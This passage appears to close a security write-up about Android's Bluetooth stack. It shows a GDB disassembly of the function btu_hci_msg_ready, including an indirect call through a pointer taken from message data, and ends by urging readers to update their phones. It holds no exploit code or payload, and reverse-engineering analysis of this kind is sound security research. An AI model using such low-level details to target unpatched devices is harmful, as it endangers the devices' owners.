   0xacec41cc <+20>:	cmp.w	r0, #4096	; 0x1000
   0xacec41d0 <+24>:	beq.n	0xacec4202 <btu_hci_msg_ready+74>
   0xacec41d2 <+26>:	cmp.w	r0, #4352	; 0x1100
   0xacec41d6 <+30>:	beq.n	0xacec422c <btu_hci_msg_ready+116>
   0xacec41d8 <+32>:	cmp.w	r0, #4608	; 0x1200
   0xacec41dc <+36>:	bne.n	0xacec424c <btu_hci_msg_ready+148>
   0xacec41de <+38>:	mov	r0, r4
   0xacec41e0 <+40>:	ldmia.w	sp!, {r4, lr}
   0xacec41e4 <+44>:	b.w	0xace968a4 <btm_route_sco_data>
   0xacec41e8 <+48>:	beq.n	0xacec4236 <btu_hci_msg_ready+126>
   0xacec41ea <+50>:	cmp.w	r0, #6400	; 0x1900
   0xacec41ee <+54>:	beq.n	0xacec4242 <btu_hci_msg_ready+138>
   0xacec41f0 <+56>:	cmp.w	r0, #5888	; 0x1700
   0xacec41f4 <+60>:	bne.n	0xacec424c <btu_hci_msg_ready+148>
   0xacec41f6 <+62>:	ldr	r1, [r4, #8]
---Type <return> to continue, or q <return> to quit---
   0xacec41f8 <+64>:	mov	r0, r4
   0xacec41fa <+66>:	blx	r1
   0xacec41fc <+68>:	ldr	r0, [pc, #92]	; (0xacec425c <btu_hci_msg_ready+164>)
   0xacec41fe <+70>:	add	r0, pc
   0xacec4200 <+72>:	b.n	0xacec4214 <btu_hci_msg_ready+92>
   0xacec4202 <+74>:	uxtb	r0, r1
   0xacec4204 <+76>:	mov	r1, r4
   0xacec4206 <+78>:	bl	0xacec3480 <btu_hcif_process_event>
   0xacec420a <+82>:	mov	r0, r4
   0xacec420c <+84>:	bl	0xaced6d68 <osi_free>
   0xacec4210 <+88>:	ldr	r0, [pc, #68]	; (0xacec4258 <btu_hci_msg_ready+160>)
   0xacec4212 <+90>:	add	r0, pc
   0xacec4214 <+92>:	ldr	r0, [r0, #0]
   0xacec4216 <+94>:	movw	r1, #10018	; 0x2722
   0xacec421a <+98>:	ldrh	r1, [r0, r1]
   0xacec421c <+100>:	ldrh	r0, [r0, #2]
   0xacec421e <+102>:	cmp	r0, r1
   0xacec4220 <+104>:	it	ne
   0xacec4222 <+106>:	popne	{r4, pc}
   0xacec4224 <+108>:	ldmia.w	sp!, {r4, lr}
   0xacec4228 <+112>:	b.w	0xacde5910 <bte_main_lpm_allow_bt_device_sleep>---Type <return> to continue, or q <return> to quit---

   0xacec422c <+116>:	mov	r0, r4
   0xacec422e <+118>:	ldmia.w	sp!, {r4, lr}
   0xacec4232 <+122>:	b.w	0xacec6638 <l2c_rcv_acl_data>
   0xacec4236 <+126>:	uxtb	r0, r1
   0xacec4238 <+128>:	mov	r1, r4
   0xacec423a <+130>:	ldmia.w	sp!, {r4, lr}
   0xacec423e <+134>:	b.w	0xacec3c3c <btu_hcif_send_cmd>
   0xacec4242 <+138>:	mov	r0, r4
   0xacec4244 <+140>:	ldmia.w	sp!, {r4, lr}
   0xacec4248 <+144>:	b.w	0xacecf76c <l2c_link_segments_xmitted>
   0xacec424c <+148>:	mov	r0, r4
   0xacec424e <+150>:	ldmia.w	sp!, {r4, lr}
   0xacec4252 <+154>:	b.w	0xaced6d68 <osi_free>
   0xacec4256 <+158>:	nop
   0xacec4258 <+160>:	andeq	r5, r7, r2, asr #19
   0xacec425c <+164>:	ldrdeq	r5, [r7], -r6
End of assembler dump.
```


Stay secure!

Update your Android or get a new Mobile if you cannot update it, receive new updates!

